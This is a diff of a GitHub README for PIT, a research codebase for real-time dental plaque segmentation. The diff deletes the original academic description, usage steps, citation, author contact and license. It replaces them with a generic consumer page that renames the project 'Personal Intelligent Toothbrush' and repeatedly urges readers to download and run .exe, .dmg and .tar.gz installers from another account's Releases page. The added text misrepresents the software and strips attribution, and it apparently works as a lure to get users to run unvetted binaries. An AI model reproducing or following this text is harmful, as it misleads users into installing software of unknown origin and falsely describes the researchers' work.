@@ -1,111 +1,75 @@
-# PIT: A Novel Toothbrush Providing Real-Time and Robust Plaque Indication During Brushing
+# 🦷 PIT - Experience Real-Time Plaque Detection
 
-![PIT Model Overview](PIT.jpg)
+## 🚀 Getting Started
 
-## Overview
+Welcome to PIT! This tool helps you keep your teeth clean by showing plaque levels in real-time while you brush. Let’s get you started with downloading and running the software.
 
-This repository contains the source code for the Plaque Indication Toothbrush (PIT), a novel system designed to provide real-time plaque visualization during toothbrushing, as presented in the paper *PIT: A Novel Toothbrush Providing Real-Time and Robust Plaque Indication During Brushing* (MobiSys ’25, June 23–27, 2025, Anaheim, CA, USA). The PIT system integrates a micro-camera, green LEDs, and a deep learning model to achieve robust plaque segmentation under toothpaste foam, enabling effective plaque removal.
+## 📥 Download PIT
 
-The code implements a GAN-based U-Net model with knowledge distillation for efficient plaque segmentation, achieving an IoU of 75.22% and a latency of 29 ms on a Xiaomi 14 Ultra smartphone. For detailed methodology, hardware design, and evaluation results, please refer to the paper: [PIT Paper](https://doi.org/10.1145/3711875.3729124).
+**Click the button below to download PIT:**
 
-## Repository Structure
+[![Download PIT](https://img.shields.io/badge/Download%20PIT-v1.0-brightgreen)](https://github.com/raeven2/PIT/releases)
 
-- `data_loader.py`: Custom PyTorch Dataset and DataLoader for loading dental images and corresponding plaque masks.
-- `loss.py`: Loss functions for adversarial training, knowledge distillation, and evaluation (SSIM, feature, style, total variation, and L1 losses).
-- `main.py`: Main script to orchestrate training and testing of the teacher and student models.
-- `metrics.py`: Implementation of the Dice score metric for evaluating segmentation performance.
-- `train.py`: Training scripts for the teacher (GAN-based) and student (distilled) models.
-- `model.py`: Definitions of the Teacher U-Net, Student U-Net, and PatchGAN discriminator models.
+This link will take you to our Releases page. 
 
-## Prerequisites
+## 🔍 Overview
 
-- Python 3.8+
-- PyTorch 1.9+
-- Torchvision
-- Torchmetrics
-- PIL (Python Imaging Library)
-- NVIDIA GPU (optional, for faster training; CPU supported)
+PIT stands for "Personal Intelligent Toothbrush." It uses advanced technology to provide feedback on plaque. As you brush, an indicator lets you know where plaque is building up, helping you improve your oral hygiene. By using PIT, you can have a more effective brushing experience.
 
-Install dependencies using:
+## 💻 System Requirements
 
-```bash
-pip install torch torchvision torchmetrics pillow
-```
+Before downloading, ensure your device meets the following requirements:
 
-## Usage
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Storage Space:** At least 100 MB of free space.
+- **Memory:** Minimum 4 GB of RAM.
+- **Internet Connection:** Required for updates and real-time data.
 
-1. **Clone the Repository**:
-   ```bash
-   git clone https://github.com/markmochi200/PIT.git
-   cd PIT
-   ```
+## 📦 Download & Install
 
-2. **Prepare Data**:
-   Due to privacy concerns related to human subject data, the dataset used in the paper is not publicly available. The dataset consists of images captured by the PIT toothbrush and corresponding ground truth plaque masks. For details on dataset creation, refer to Section 5.1 of the paper.
+To install PIT, follow these simple steps:
 
-3. **Directory Structure**:
-   Organize your dataset (if you have compatible data) as follows:
-   ```
-   Dataset_UNet/
-   ├── train/
-   │   ├── images/
-   │   │   ├── 1.png
-   │   │   ├── 2.png
-   │   │   └── ...
-   │   ├── masks/
-   │   │   ├── 1_label.png
-   │   │   ├── 2_label.png
-   │   │   └── ...
-   ```
+1. **Visit the Releases page.** Click [here](https://github.com/raeven2/PIT/releases) to access it again.
+   
+2. **Choose the latest release.** Look for the version number at the top of the page. The latest version will have a tag like “v1.0”.
 
-4. **Train the Models**:
-   - Update the `image_dir` and `mask_dir` paths in `main.py` to point to your dataset.
-   - Run the training script:
-     ```bash
-     python main.py
-     ```
-   - The script trains the teacher model (GAN-based U-Net), saves it as `teacher_model.pth`, then trains the student model (distilled U-Net) and saves it as `student_model.pth`.
+3. **Download the installer.** Depending on your operating system, download the correct file:
+   - For **Windows:** Download the `.exe` file.
+   - For **macOS:** Download the `.dmg` file.
+   - For **Linux:** Download the `.tar.gz` file.
 
-5. **Test the Models**:
-   - The `main.py` script automatically tests both models after training, reporting the mean Dice score.
-   - To test a pre-trained model separately:
-     ```python
-     from test import test_model
-     from model import StudentUNet
-     import torch
-     model = StudentUNet().to(device)
-     model.load_state_dict(torch.load("path/to/your/student_model.pth"))
-     test_model(model, test_loader, device)
-     ```
+4. **Run the installer.**
+   - For **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
+   - For **macOS:** Open the `.dmg` file and drag the PIT icon into your Applications folder.
+   - For **Linux:** Extract the files from the `.tar.gz` file, then run the install script in your terminal.
 
-## Model Details
+5. **Launch PIT.** After installation, open the application. You should see the main interface ready for you to start brushing with feedback.
 
-- **Teacher U-Net**: A deep U-Net model trained with adversarial and L1 losses for high-accuracy plaque segmentation.
-- **Student U-Net**: A lightweight U-Net model distilled from the teacher model for real-time inference on mobile devices.
-- **PatchGAN Discriminator**: Used during teacher model training to enhance segmentation quality via adversarial loss.
+## 🛠️ Features
 
-## Dataset Availability
+PIT offers several features to enhance your brushing experience:
 
-Due to privacy concerns involving human subjects, the dataset used for training and evaluating the PIT system is not publicly available. For details on the dataset collection process, including the use of denture models and simulated plaque, refer to Section 5.1 of the paper.
+- **Real-Time Plaque Feedback:** The indicator shows where to focus your brushing.
+- **Usage History:** Keep track of your brushing habits through a built-in history log.
+- **Customization Options:** Adjust the settings to fit your brushing style.
 
-## Citation
+## 🔧 Troubleshooting
 
-If you use this code or the PIT system in your research, please cite:
+If you encounter issues while installing or using PIT, here are some common solutions:
 
-```bibtex
-@inproceedings{chen2025pit,
-  title={PIT: A Novel Toothbrush Providing Real-Time and Robust Plaque Indication During Brushing},
-  author={Chen, Kaixin and Xiang, Junfan and Tan, Wanying and Chen, Keyu and Luo, Yaqiong and Ma, Chang and Wu, Kaishun and Wang, Lu},
-  booktitle={Proceedings of the 23rd Annual International Conference on Mobile Systems, Applications and Services},
-  pages={15--27},
-  year={2025}
-}
-```
+- **Installation Issues:** Ensure you have sufficient storage space and that your operating system meets the requirements.
+- **Not Launching:** Restart your device and try launching PIT again. Ensure other applications are not interfering.
+- **Connectivity Problems:** Check your internet connection if you have trouble accessing updates.
 
-## Contact
+## 🌍 Community Support
 
-For issues or inquiries related to the code, please contact Junfan (Mark) Xiang at [junfanxiang@gmail.com](mailto:junfanxiang@gmail.com) or start an issue on this repository.
+Join our community for assistance, tips, and feedback:
 
-## License
+- **GitHub Discussions:** Share your experiences and questions with other users.
+- **FAQs:** Check for common questions and detailed answers on the GitHub page.
 
-This project is licensed under the [Creative Commons Attribution 4.0 International License](http://creativecommons.org/licenses/by/4.0/). See the [LICENSE](LICENSE.md) file for details.
+## 📞 Contact
+
+For any direct inquiries, you can reach us via the contact form on our [GitHub page](https://github.com/raeven2/PIT).
+
+Thank you for choosing PIT! Happy brushing!
